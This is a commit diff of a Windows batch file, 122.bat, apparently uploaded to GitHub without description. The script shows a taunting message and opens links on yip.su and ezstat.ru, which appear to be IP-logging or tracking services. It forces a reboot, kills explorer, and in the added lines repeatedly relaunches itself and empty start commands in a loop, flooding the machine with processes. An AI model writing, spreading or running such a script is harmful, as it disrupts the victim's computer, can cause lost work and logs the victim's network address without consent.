f5e77fadeac6aee5f05365715f3d768800569f33
redcat607oficcial <101455968+redcat607oficcial@users.noreply.github.com>
2023-09-27 07:25:20 +0200

    Add files via upload

--- 122.bat
+++ 122.bat
@@ -5,7 +5,7 @@
 ::YAwzuBVtJxjWCl3EqQJgSA==
 ::ZR4luwNxJguZRRnk
 ::Yhs/ulQjdF+5
-::cxAkpRVqdFKZSTk=
+::cxAkpRVqdFKZSzk=
 ::cBs/ulQjdF+5
 ::ZR41oxFsdFKZSDk=
 ::eBoioBt6dFKZSDk=
@@ -14,28 +14,42 @@
 ::dAsiuh18IRvcCxnZtBJQ
 ::cRYluBh/LU+EWAnk
 ::YxY4rhs+aU+JeA==
-::cxY6rQJ7JhzQF1fEqQJhekk0
-::ZQ05rAF9IBncCkqN+0xwdVsFHlbi
-::ZQ05rAF9IAHYFVzEqQJhekk0
-::eg0/rx1wNQPfEVWB+kM9LVsJDFXQbgs=
-::fBEirQZwNQPfEVWB+kM9LVsJDFXQbgs=
-::cRolqwZ3JBvQF1fEqQJhekk0
-::dhA7uBVwLU+EWAjWpiI=
-::YQ03rBFzNR3SWATEpRBiSA==
-::dhAmsQZ3MwfNWATEpRBiSA==
-::ZQ0/vhVqMQ3MEVWAtB9weUkGLA==
-::Zg8zqx1/OA3MEVWAtB9weUkGLA==
-::dhA7pRFwIByZRRnVphBQ
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
 ::Zh4grVQjdCmDJAjWpgw1MB40
 ::YB416Ek+ZW8=
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
 msg *he know*
-start https://yip.su/RNwkd.mp4
+start https://yip.su/RNwkd
 do:
 shutdown -t 60 -r -f
-start 122.exe
+start 122
 taskkill explorer
+start https://ezstat.ru/2ci9w4
+start
+start
+start 122
+start 122
+start 122
+start 122
+start 122
+start
+start
+start
+start
+start
+start
 start
 loop:
